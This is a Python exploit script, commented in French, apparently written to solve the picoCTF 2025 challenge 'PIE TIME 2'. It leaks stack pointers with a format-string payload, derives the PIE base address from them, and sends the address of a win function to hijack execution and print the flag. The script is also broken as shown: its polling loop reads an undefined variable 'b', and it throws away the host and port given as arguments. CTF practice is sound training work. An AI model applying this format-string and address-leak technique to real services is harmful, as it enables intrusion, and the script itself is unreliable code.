# 491 - PIE TIME 2  (Binary Exploitation, picoCTF 2025)
# Flag: not archived
# Write-up: ../../../writeups/binary-exploitation/491-pie-time-2.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, json, re, time, socket

# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
# l'hote et le port (ou l'URL) en argument de ce script.
_A = sys.argv[1:]
HOST = _A[0] if len(_A) > 0 else ""
PORT = int(_A[1]) if len(_A) > 1 else 0
url = _A[0] if _A else ""

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

WIN_OFF = 0x1376
MAIN_RET = 0x14B4   # retour de call_functions dans main
host = port = None
for _ in range(12):
    time.sleep(2)
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)


def session():
    s = socket.create_connection((host, port), timeout=20)
    s.settimeout(6)
    time.sleep(0.4)
    try:
        s.recv(4096)
    except Exception:
        pass
    return s


def leak(fmt, wait=0.8):
    s = session()
    s.sendall((fmt + "\n").encode())
    time.sleep(wait)
    out = b""
    try:
        while True:
            c = s.recv(8192)
            if not c:
                break
            out += c
            if b"0x12345" in out:
                break
    except Exception:
        pass
    s.close()
    return out.decode("utf-8", "replace")


fmt = ".".join(f"%{i}$p" for i in range(20, 61))
txt = leak(fmt)
print("leak 20-60:", txt[:400])
vals = {}
for i, m in zip(range(20, 61), re.finditer(r"(?:0x[0-9a-f]+|\(nil\))", txt)):
    vals[i] = m.group(0)
pie = [(i, v) for i, v in vals.items() if v.startswith("0x") and 0x500000000000 <= int(v, 16) <= 0x700000000000]
print("\ncandidats PIE:", [(i, v) for i, v in pie])
for i, v in pie:
    x = int(v, 16)
    for off in (MAIN_RET, 0x1418, 0x12ca, 0x1350):
        base = x - off
        if base & 0xFFF == 0:
            win = base + WIN_OFF
            print(f"  %{i}$p={v} off={hex(off)} base={hex(base)} win={hex(win)}")
            s = session()
            s.sendall((fmt + "\n").encode())
            time.sleep(0.6)
            try:
                s.recv(8192)
            except Exception:
                pass
            s.sendall((hex(win) + "\n").encode())
            time.sleep(0.8)
            r = b""
            try:
                r = s.recv(8192)
            except Exception:
                pass
            s.close()
            rt = r.decode("utf-8", "replace")
            print("   ->", rt[:160].replace("\n", " "))
            fl = re.search(r"(?:academy|picoCTF)\{[^}]*\}", rt)
            if fl:
                print("FLAG:", fl.group(0))
                sys.exit(0)
